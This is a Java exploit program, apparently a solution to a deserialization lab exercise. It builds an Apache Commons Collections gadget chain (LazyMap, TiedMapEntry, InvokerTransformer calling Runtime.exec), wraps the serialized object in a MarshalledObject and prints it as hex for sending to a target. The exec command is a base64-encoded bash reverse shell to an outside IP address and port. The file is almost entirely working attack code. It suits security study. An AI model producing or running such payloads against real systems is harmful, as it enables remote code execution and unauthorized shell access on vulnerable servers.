package lab5;

import com.yxxx.javasec.deserialize.MarshalledObject;
import lab1.Utils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class Exp {
    public static void setField(Object o,String name, Object value) throws Exception{
        Field field = o.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(o, value);
    }

    public static void main(String[] args) throws Exception{
        Transformer[] fake = new Transformer[]{
                new ConstantTransformer(1)
        };

        Transformer[] trueTrans = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMi4xNjYvNTY1NiAwPiYx}|{base64,-d}|{bash,-i}"}),
                new ConstantTransformer(1)
        };

        Transformer transformer = new ChainedTransformer(fake);

        Map innerMap = new HashMap();
        Map outMap = LazyMap.decorate(innerMap, transformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, "aa");

        Map exp = new HashMap();
        exp.put(tiedMapEntry, "bb");
        outMap.remove("aa");

        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(transformer, trueTrans);

        // serialize
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(exp);
        byte[] bytes = bos.toByteArray();

        MarshalledObject marshalledObject = new MarshalledObject();
        setField(marshalledObject, "bytes", bytes);

        ByteArrayOutputStream bos1 = new ByteArrayOutputStream();
        ObjectOutputStream oos1 = new ObjectOutputStream(bos1);
        oos1.writeUTF("SJTU");
        oos1.writeInt(1896);
        oos1.writeObject(marshalledObject);
        System.out.println(Utils.bytesTohexString(bos1.toByteArray()));

        // deserialize for test
//        ByteArrayInputStream bis = new ByteArrayInputStream(bos1.toByteArray());
//        ObjectInputStream ois = new ObjectInputStream(bis);
//        ois.readObject();
    }
}
